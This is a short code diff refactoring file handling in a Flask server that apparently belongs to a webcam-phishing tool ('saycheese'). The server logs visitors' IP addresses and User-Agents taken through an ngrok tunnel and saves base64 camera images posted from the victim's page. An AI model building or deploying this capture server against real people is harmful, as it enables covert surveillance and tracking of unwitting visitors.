@@ -67,24 +67,20 @@ try:
         if request.method == 'GET':
             now = str(datetime.now())
             req = requests.get('http://localhost:4040/api/requests/http').json()
-            user_agent = req['requests'][0]['request']['headers']['User-Agent'][0]        
+            user_agent = req['requests'][0]['request']['headers']['User-Agent'][0]
             ip_address = req['requests'][0]['request']['headers']['X-Forwarded-For'][0]
 
 
-            # writing file
-            file1 = open('myfile.txt', 'a')
-            file1.write("Date and Time:\t")
-            file1.write(str(now))
-            file1.write("\nIP:\t")
-            file1.write(str(ip_address))
-            file1.write("\nUser-Agent:\t")
-            file1.write(str(user_agent))
-            file1.write("\n\n")
-            file1.close()
-
+            with open('myfile.txt', 'a') as file1:
+                file1.write("Date and Time:\t")
+                file1.write(str(now))
+                file1.write("\nIP:\t")
+                file1.write(str(ip_address))
+                file1.write("\nUser-Agent:\t")
+                file1.write(str(user_agent))
+                file1.write("\n\n")
             print(f"{now} \t {bcolors.OKCYAN}{ip_address}{bcolors.ENDC} \t {user_agent}\t")
 
-        # post request
         elif request.method == 'POST':
             now = str(datetime.now())
 
@@ -94,14 +90,12 @@ try:
             completeName = os.path.join(save_path, file_name)
 
             # requesting base64 image data 
-            req_data = request.get_json() 
+            req_data = request.get_json()
             encoded = req_data['canvasData']
 
-            # writing file
-            file2 = open(completeName, 'wb')
-            data = base64.b64decode(encoded)
-            file2.write(data)
-            file2.close()
+            with open(completeName, 'wb') as file2:
+                data = base64.b64decode(encoded)
+                file2.write(data)
             print(f"{bcolors.OKGREEN}[{bcolors.ENDC}+{bcolors.OKGREEN}] Cam image recieved.{bcolors.FAIL} \n ")
         return render_template("saycheese.html")
         
